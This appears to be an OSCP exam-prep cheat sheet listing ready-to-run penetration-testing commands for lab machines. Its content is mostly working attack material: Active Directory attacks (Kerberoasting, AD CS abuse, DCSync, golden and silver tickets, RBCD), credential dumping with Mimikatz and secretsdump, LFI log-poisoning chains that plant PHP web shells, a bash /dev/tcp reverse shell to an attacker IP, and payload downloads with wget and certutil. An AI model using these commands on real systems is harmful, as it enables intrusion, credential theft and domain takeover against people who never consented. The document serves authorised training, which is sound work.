# OSCP Consolidated Commands Reference

This document provides a comprehensive reference of working commands extracted from lab machine notes. Each section follows a logical penetration testing flow and includes multiple variations (flags, authentication levels) for maximum reliability.

---

## 1. Scanning & Reconnaissance

### NMAP (General)
Always try multiple scan speeds and script combinations.

- **Fast Full Scan:**
  ```bash
  nmap -sS -p- -T4 -vv 10.10.10.10
  ```
- **Standard OSCP Scan (Service/Scripts/OS):**
  ```bash
  nmap -sV -sC -O -oN nmap_report 10.10.10.10
  ```
- **UDP Scan (Slow, pick top ports):**
  ```bash
  sudo nmap -sU --top-ports 100 -sV 10.10.10.10
  ```
- **Script-Specific Scan (Vulnerability check):**
  ```bash
  nmap --script "vuln or exploit" -p 80,443,445 10.10.10.10
  ```

### Web Discovery (Fuzzing)
- **Directory Fuzzing (Standard):**
  ```bash
  ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/big.txt -t 50
  ```
- **Subdomain/VHost Fuzzing:**
  ```bash
  ffuf -u http://[DOMAIN] -H "Host: FUZZ.[DOMAIN]" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
  ```
- **Extension Brute Force:**
  ```bash
  ffuf -u http://10.10.10.10/FUZZ -w list.txt -e .php,.txt,.bak,.old
  ```

### SMB Enumeration
Try null sessions and guest accounts first.

- **Null Session (No credentials):**
  ```bash
  smbclient -L //10.10.10.10 -N
  rpcclient -U "" -N 10.10.10.10
  netexec smb 10.10.10.10 -u '' -p ''
  ```
- **Guest Account:**
  ```bash
  smbclient -L //10.10.10.10 -U guest%
  netexec smb 10.10.10.10 -u guest -p ''
  ```
- **Password Spraying (Targeted Wordlist)**:
  - *Tip*: Try `SeasonYear` (e.g., `Spring2023`), `Username`, and `emansenru` (reversed username).
- **Authenticated (User:Pass):**
  ```bash
  smbclient //10.10.10.10/[SHARE] -U 'DOMAIN/user%password'
  netexec smb 10.10.10.10 -u user -p password
  ```
- **RID Brute Forcing (User Enumeration):**
  ```bash
  netexec smb 10.10.10.10 -u guest -p '' --rid-brute
  rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
  ```
  smbmap -H 10.10.10.10
  netexec smb 10.10.10.10 -u user -p password --shares
```
- **NTLM Hash Theft (Writable Share)**:
  - *Why*: If you have write access to a share, force users to authenticate to your Kali.
  - 1. Generate LNK: `python3 ntlm_theft.py -g lnk -s 172.10.10.10 -f theft`
  - 2. Listen: `impacket-smbserver share . -smb2support`
  - 3. Upload `.lnk` file to the victim share. Wait for capture.

### LDAP Enumeration
- **Null Base Search:**
  ```bash
  ldapsearch -x -H ldap://10.10.10.10 -b "dc=[DOMAIN],dc=local"
  ```
- **Authenticated User Search:**
  ```bash
  ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "dc=[DOMAIN],dc=local" "(objectClass=user)" sAMAccountName
  ```
- **Fetch User Descriptions (Common leak path):**
  ```bash
  netexec ldap 10.10.10.10 -u user -p password -M get-desc-users
  ```

---

## 2. Active Directory (Windows)

### Roasting Attacks
- **AS-REP Roasting (No initial creds needed):**
  - **Impacket**: `impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10`
  - **Rubeus**: `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt`
- **Kerberoasting (Requires user creds):**
  - **Impacket**: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip 10.10.10.10 -request`
  - **Rubeus**: `Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt`

- **RPC Password Change (ForceChangePassword)**:
  - *Why*: If you have ForceChangePassword rights over another user.
  - `net rpc password "target_user" "NewPass123!" -U "DOMAIN/user%password" -S 10.10.10.10`

### AD Object Manipulation (BloodyAD)
Use this for interacting with AD objects from Kali without requiring a full Windows foothold.

- **Check Current User Rights**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 get object 'CN=target_user,CN=Users,DC=domain,DC=local'
  ```
- **Add User to a Group (GenericAll/WriteMember rights)**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 add groupMember 'CN=Domain Admins,CN=Users,DC=domain,DC=local' 'CN=my_user,CN=Users,DC=domain,DC=local'
  ```
- **Reset User Password (GenericAll/ForceChangePassword rights)**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 set password 'CN=target_user,CN=Users,DC=domain,DC=local' 'NewPassword123!'
  ```
- **Reset- **RPC Password Reset (ForceChangePassword Rights):**
  - `net rpc password [TARGET_USER] [NEW_PASS] -U [DOMAIN]/[MY_USER]%[MY_PASS] -S [DC_IP]`

### Advanced AD Paths (OCD Style)

#### 1. AD CS (Certificate Services)
- **Discovery (Certipy):**
  ```bash
  certipy find -u [USER]@[DOMAIN] -p [PASS] -dc-ip [DC_IP] -vulnerable
  ```
- **ESC1 (Enrollee Supplies Subject):**
  - *Scenario*: Template allows SAN specification (impersonation).
  - `certipy req -u [USER]@[DOMAIN] -p [PASS] -ca [CA_NAME] -template [VULN_TEMPLATE] -upn administrator@[DOMAIN] -dc-ip [DC_IP]`
  - `certipy auth -pfx administrator.pfx -dc-ip [DC_IP]`
- **ESC8 (AD CS NTLM Relay):**
  - *Scenario*: Web Enrollment (HTTP) is enabled without NTLM protection.
  - 1. Setup Relay: `impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template [TEMPLATE]`
  - 2. Trigger Auth: Use PetitPotam or SpoolSample to the relay.

#### 2. Shadow Credentials (msDS-KeyCredentialLink)
- **Scenario**: You have **GenericWrite** or **GenericAll** over a user/computer but cannot reset their password.
- **Execution (Certipy):**
  ```bash
  certipy shadow auto -u [MY_USER]@[DOMAIN] -p [MY_PASS] -account [TARGET_ACCOUNT] -dc-ip [DC_IP]
  ```
- **Execution (PyWhisker):**
  ```bash
  python3 pywhisker.py -d [DOMAIN] -u [MY_USER] -p [MY_PASS] --target [TARGET] --action "add"
  ```
- **Note**: This generates a certificate you use to authenticate via PKINIT.
- **Set GenericWrite (e.g., set DS-Install-Replica for DCSync)**:
  ```bash
  # Granting DCSync rights to a user
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 add right 'DC=domain,DC=local' 'CN=my_user,CN=Users,DC=domain,DC=local' DCSync
  ```

### Credential Dumping
- **Secretsdump (From Kali):**
  ```bash
  impacket-secretsdump [DOMAIN]/[USER]:[PASS]@10.10.10.10
  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  ```
- **Rubeus (Dump Current Session Tickets):**
  ```powershell
  Rubeus.exe triage
  Rubeus.exe dump /nowrap
  ```
- **LAPS Password Reading**:
  - **Netexec**: `netexec smb 10.10.10.10 -u [USER] -p [PASS] --laps`
  - **pyLAPS**: `python3 pyLAPS.py --action get -d [DOMAIN] -u [USER] -p [PASS]`
- **Offline Chrome Password Extraction**:
  - *File*: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data` (SQLite)
  - *Action*: Copy file to Kali and query: `sqlite3 'Login Data' "SELECT origin_url, username_value FROM logins;"` (Note: `password_value` is encrypted).
- **Offline NTDS Dumping (Secretsdump)**:
  - *Scenario*: You've stolen the `ntds.dit` and `SYSTEM` files from a backup or share.
  - `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
- **gMSA Password Reading (GMSAPasswordReader)**:
  - *Why*: If a user has rights to read a Group Managed Service Account password.
  - `.\GMSAPasswordReader.exe --AccountName 'svc_apache'`
- **Mimikatz (On Target Windows):**
  ```powershell
  # Dump LSA
  privilege::debug
  sekurlsa::logonpasswords
  # Dump SAM
  lsadump::sam
  ```

### Lateral Movement & Execution
- **PsExec (SMB session):**
  ```bash
  impacket-psexec [DOMAIN]/[USER]:[PASS]@10.10.10.10
  impacket-psexec -hashes :[NTHASH] [USER]@10.10.10.10
  ```
- **WmiExec (Quieter than PsExec):**
  ```bash
  impacket-wmiexec [DOMAIN]/[USER]:[PASS]@10.10.10.10
  ```
- **Evil-WinRM:**
  ```bash
  evil-winrm -i 10.10.10.10 -u [USER] -p [PASS]
  evil-winrm -i 10.10.10.10 -u [USER] -H [NTHASH]
  ```
- **Invoke-RunasCs (PowerShell Lateral Movement)**:
  ```powershell
  Import-Module .\Invoke-RunasCs.ps1
  Invoke-RunasCs -Username [USER] -Password [PASS] -Command "cmd.exe" -Remote 172.10.10.10:443
  ```
- **Restricted Admin Mode RDP (Pass-the-Hash RDP)**:
  - *Enable*: `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
  - *Login*: `mstsc.exe /v:10.10.10.10 /restrictedadmin`
  - *Context*: Allows RDP access using the current user's token or via `pth-winexe`.

### AD Object Hijacking & BloodHound
- **Collecting Data:**
  ```bash
  python3 bloodhound.py -u user -p pass -d domain.local -ns 10.10.10.10 -c All
  ```
- **DCSync (If User has Right):**
  ```bash
  impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@10.10.10.10
  ```
- **GPO Abuse (GenericWrite on GPO)**:
  - *Why*: If you have write access to a Group Policy Object.
  - `.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount [MY_USER]`
  - Apply immediately: `gpupdate /force`
- **GPO Abuse via GPMC (Admin Interface)**:
  - *Action*: If you have UI access and GenericWrite on a GPO, use `gpmc.msc`.
  - *Path*: `Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks`.
  - *Task*: Create "Immediate Task" to run `net localgroup "Domain Admins" [USER] /add`.

### Native AD Enumeration (PowerShell)
Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded yet.

- **Enumerate Users with SPNs (LDAP Search)**:
  ```powershell
  $ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
  $domain = New-Object System.DirectoryServices.DirectoryEntry
  $search = New-Object System.DirectoryServices.DirectorySearcher($domain)
  $search.Filter = $ldapFilter
  $search.FindAll() | %{ $_.GetDirectoryEntry() | Select-Object @{N="User";E={$_.sAMAccountName}}, @{N="SPN";E={$_.servicePrincipalName}} }
  ```

---

## 3. Initial Access (Web & CMS)

### File Upload Bypasses
- **.htaccess Bypass (Add Type)**:
  - *Scenario*: Upload folder blocked PHP but allows `.htaccess`.
  - 1. Upload `.htaccess` with content: `AddType application/x-httpd-php .php16`
  - 2. Upload shell as `shell.php16`. The server will now execute it as PHP.
- **Client-Side Bypass**: Use Burp to intercept and change extension/MIME type.
- **Double Extension**: `shell.php.jpg` or `shell.php.png`

### WordPress
- **Scan Users & Plugins:**
  ```bash
  wpscan --url http://10.10.10.10 --enumerate u,vp,vt --plugins-detection aggressive --disable-tls-checks
  ```
- **Brute Force:**
  ```bash
  wpscan --url http://10.10.10.10 --usernames user_list.txt --passwords rockyou.txt
  ```

### SQL Injection & MSSQL
- **Sqlmap (Automated):**
  ```bash
  sqlmap -u "http://10.10.10.10/page.php?id=1" --dbms mysql --batch --dump
  sqlmap -r request.txt --level 5 --risk 3
  ```
- **MSSQL Login & Impersonation**:
  - **Login**: `impacket-mssqlclient 'DOMAIN/user':'password'@10.10.10.10 -windows-auth`
  - **Find Impersonatable**: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
  - **Impersonate**: `EXECUTE AS LOGIN = 'target_user'`
- **Reading Files via SQLi:**
  ```sql
  ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
  ```

### LFI (Local File Inclusion) & Reverse Shells
Include multiple variations for different OS targets and filtering environments.

#### 1. Discovery & Basic Exploitation
- **Basic Linux (passwd):** `?page=../../../../etc/passwd`
- **Basic Windows (win.ini):** `?page=../../../../windows/win.ini`
- **Null Byte Bypass (Legacy PHP <5.3.4):** `?page=../../../../etc/passwd%00`
- **Path Over-extension (Bypass filter):** `?page=../../../../../../../../../../../../../../../../etc/passwd`

#### 2. Advanced LFI Vectors (Wrapper Attacks)
- **PHP Filters (Base64 Encode - Bypass execution/filters):**
  - *Why*: Use this to read source code without triggering the PHP parser or if the app appends extensions.
  - `?page=php://filter/convert.base64-encode/resource=index.php`
- **Data Wrapper (RCE if `allow_url_include=On`):**
  - `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id`
- **Expect Wrapper (RCE if enabled):**
  - `?page=expect://id`

#### 3. Log Poisoning & Web Shell Chain
- **Step A: Inject PHP into Apache Logs**:
  1. Intercept a request with Burp.
  2. Change User-Agent to: `<?php system($_GET['cmd']); ?>`
  3. Send request (this poisons `/var/log/apache2/access.log`).
- **Step B: Call the Poisoned Log**:
  - `?page=/var/log/apache2/access.log&cmd=id`
- **Step C: Upload a Permanent Web Shell**:
  - `?page=/var/log/apache2/access.log&cmd=echo "<?php system(\$_GET['c']); ?>" > /var/www/html/shell.php`
- **Step D: Trigger the Permanent Shell**:
  - `http://10.10.10.10/shell.php?c=id`

#### 4. LFI / SSRF to NTLM Capture (Windows Only)
- *Why*: Forces the server to authenticate to your Kali SMB share, giving you a hash to crack.
- **LFI Trigger**: `?page=//172.10.10.10/share`
- **SSRF Trigger**: Enter `http://172.10.10.10` in a URL/Search field.
- **Capture**: `sudo responder -I tun0 -v`

#### 5. Web Shell Execution Options
- **PHP system()**: `?cmd=id`
- **PHP exec() (Hidden output)**: `?cmd=id > /tmp/out`
- **PHP passthru()**: `?cmd=id`
- **Ivan Sincek PHP RevShell (High Quality)**:
  - Upload via LFI/Logs: `wget http://172.10.10.10/shell.php -O /var/www/html/rev.php`
  - Trigger: `http://10.10.10.10/rev.php`
- **Generic RevShell One-liner (Trigger via shell.php?cmd=...)**:
  - `bash -c 'bash -i >& /dev/tcp/172.10.10.10/4444 0>&1'`
  - *URL Encoded*: `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.10.10.10%2F4444%200%3E%261%27`

---

## 4. Privilege Escalation

### Linux
- **Check Sudo Permissions:**
  ```bash
  sudo -l
  ```
- **SUID Binary Search:**
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- **Specific Escapes (GTFOBins):**
  - **Find:** `find . -exec /bin/sh \; -quit`
  - **Vim:** `:set shell=/bin/bash` followed by `:shell`
  - **Git:** `sudo git help config` then `!/bin/bash`
  - **Teehee:** `echo "root2::0:0::/root:/bin/bash" | sudo teehee -a /etc/passwd`
- **Capabilities Exploitation:**
  ```bash
  getcap -r / 2>/dev/null
  # If python has cap_setuid:
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

### Windows
- **Checks:**
  ```powershell
  winpeas.exe any
  whoami /priv # Check for SeBackupPrivilege, SeImpersonatePrivilege
  ```
- **Unquoted Service Path Discovery**:
  ```powershell
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
  ```
  - *Exploit*: If path is `C:\Program Files\My App\service.exe`, place shell at `C:\Program.exe` or `C:\Program Files\My.exe`.
- **SeBackupPrivilege Exploitation:**
  ```powershell
  reg save hklm\sam SAM
  reg save hklm\system SYSTEM
  ```
- **PrintSpoofer (SeImpersonate):**
  ```powershell
  PrintSpoofer.exe -c "cmd.exe" -i
  ```

- **AlwaysInstallElevated (Registry Abuse):**
  - *Verify*: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - *Exploit*: `msiexec /quiet /qn /i C:\temp\setup.msi`

- **Registry Service Hijack (ImagePath):**
  - *Action*: If you have write access to service registry key.
  - `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\[SERVICE] -Name ImagePath -Value "C:\temp\shell.exe"`
  - `Start-Service [SERVICE]`

---

## 5. Utilities & Post-Exploitation

### Shell Stabilization
- **Python TTY:**
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  # Then CTRL+Z
  stty raw -echo; fg
  export TERM=xterm
  ```

### File Transfers
- **HTTP Server (Kali):**
  ```bash
  python3 -m http.server 80
  ```
- **Downloading (Linux):**
  ```bash
  wget http://172.10.10.10/file
  curl http://172.10.10.10/file -o file
  ```
- **Downloading (Windows):**
  ```powershell
  certutil -urlcache -f http://172.10.10.10/file file.exe
  iwr -uri http://172.10.10.10/file -outf file.exe
  ```

### Password Cracking
- **Hydra (Service Brute Force):**
  ```bash
  hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 4
  hydra -L users.txt -e nsr -t 16 ftp://10.10.10.10 # -e nsr: null, same, reverse
  ```
- **John the Ripper:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  john --format=nt hashes.txt --rules
  ```
- **Hashcat:**
  ```bash
  hashcat -m 1000 ntlm_hash.txt rockyou.txt
  hashcat -m 5600 ntlm_v2_resp_hash.txt rockyou.txt
  ```

---

## 6. Advanced Active Directory & Kerberos

### Ticket Operations (Rubeus & Impacket)
- **TGT Delegation (Capture as current user):**
  ```powershell
  Rubeus.exe tgtdeleg /nowrap
  ```
- **Pass-the-Ticket (Linux):**
  ```bash
  export KRB5CCNAME=ticket.ccache
  impacket-psexec -k -no-pass [DOMAIN]/[USER]@[TARGET_NAME].[DOMAIN]
  ```
- **Converting Ticket Styles:**
  - **Kirbi to Ccache (Windows to Linux):**
    ```bash
    python3 kirbi2ccache.py ticket.kirbi ticket.ccache
    ```

### Silver Ticket Attack (Service Forgery)
- **Why**: Allows forging a ticket for a specific service (e.g., MSSQL, CIFS, HTTP) if you have the service account's NTHash.
- **Execution**:
  ```bash
  impacket-ticketer -nthash [SERVICE_NTHASH] -domain-sid [DOMAIN_SID] -domain [DOMAIN] -spn [SERVICE/HOST] [TARGET_USER]
  export KRB5CCNAME=[TARGET_USER].ccache
  ```

### Forest Trust Exploitation (Golden Ticket + Extra SIDs)
- **Why**: Escalate from a compromised Child Domain to the Forest Root Admin.
- **Requirement**: Child `krbtgt` hash and SID, Parent Forest SID (find via `lsadump::trust` or `Get-DomainSID`).
- **Execution**:
  ```bash
  mimikatz # kerberos::golden /user:Administrator /domain:[CHILD_DOMAIN] /sid:[CHILD_SID] /sids:[PARENT_SID]-519 /rc4:[CHILD_KRBTGT_HASH] /ptt
  ```

### Printer Bug (SpoolSample)
- **Why**: Force a remote machine (like a DC) to authenticate to your server.
- **Execution**: `.\SpoolSample.exe [TARGET_DC] [MY_LISTENER_SERVER]`
- **Capture**: Combine with `Rubeus monitor` to catch the TGT.

### RBCD Attack (Resource-Based Constrained Delegation)
- **Why**: Use if you have **GenericAll**, **GenericWrite**, or **WriteProperty (to msDS-AllowedToAct...)** on a Computer object.
- **1. Create Machine Account**:
  ```bash
  impacket-addcomputer [DOMAIN]/[USER]:[PASS] -computer-name 'FOO$' -computer-pass 'Bar123!'
  ```
- **2. Configure Delegation**:
  ```bash
  impacket-rbcd -delegate-from 'FOO$' -delegate-to '[TARGET_COMPUTER]$'-action write '[DOMAIN]/[USER]:[PASS]'
  ```
- **3. Get ST (Impersonate Admin)**:
  ```bash
  impacket-getST -spn 'cifs/[TARGET_COMPUTER].[DOMAIN]' -impersonate Administrator '[DOMAIN]/FOO$':'Bar123!'
  ```
- **4. Access Target**:
  ```bash
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec -k -no-pass [TARGET_COMPUTER].[DOMAIN]
  ```

### Privileged Rights Abuse
- **GenericAll / GenericWrite on User:**
  - *Action*: Change password or add SPN.
  ```bash
  rpcclient -U "DOMAIN/user%password" 10.10.10.10 -c "setuserinfo2 target_user 23 'NewPassword123!'"
  ```
- **GenericWrite (Add SPN for Kerberoasting):**
  ```powershell
  Set-ADUser target_user -ServicePrincipalNames @{Add='MSSQLSvc/fake.domain.local'}
  ```

---

## 7. Pivoting & Tunnels

### Chisel (Fast & Reliable)
- **Reverse Port Forward (Kali listens for connection):**
  ```bash
  # On Kali (Server)
  chisel server -p 8000 --reverse
  
  # On Victim (Client)
  chisel client 172.10.10.10:8000 R:8080:127.0.0.1:8080  # Forwards remote 8080 to local 8080
  ```

### SSH Tunnelling
- **Local Port Forward:**
  ```bash
  ssh -L 8080:127.0.0.1:8080 user@10.10.10.10
  ```
- **Dynamic Port Forward (SOCKS Proxy):**
  ```bash
  ssh -D 1080 user@10.10.10.10
  # Then configure proxychains (/etc/proxychains4.conf)
  proxychains nmap -sT -Pn 10.10.10.11
  ```

---

## 8. Post-Exploitation Enumeration

### History Logs (Credential Leaks)
- **Linux Bash History:**
  ```bash
  cat /home/*/.bash_history
  cat /root/.bash_history
  ```
- **Windows PowerShell History:**
  ```powershell
  cat %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```

### Configuration & Secret Hunting
- **ConfigFile Search (Linux):**
  ```bash
  find / -name "*.php" -o -name "*.config" -o -name "*.cnf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
  ```
- **Registry Query (Windows - Stored Creds):**
  ```powershell
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  ```

---

## 9. Utilities & Shell Shortcuts

### Port Knocking (Open Filtered Ports)
- **Standard Sequence:**
  ```bash
  nmap -Pn -p [PORT1] 10.10.10.10
  nmap -Pn -p [PORT2] 10.10.10.10
  nmap -Pn -p [PORT3] 10.10.10.10
  ```

### Compilation (If GCC is available)
- **Static Compile (Avoid library issues):**
  ```bash
  gcc exploit.c -o exploit -static
  ```

### Cross-Compiling (Kali to Windows)
- **Target 64-bit EXE**: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32`
- **Target DLL**: `x86_64-w64-mingw32-gcc -shared -o output.dll input.c`

### Operational Workarounds
- **Fix Kerberos Clock Skew (Faketime)**:
  - `faketime -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
- **Fix Failed "bash -i" (TTY Shell)**:
  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
  - *Then*: `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`

---
**Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
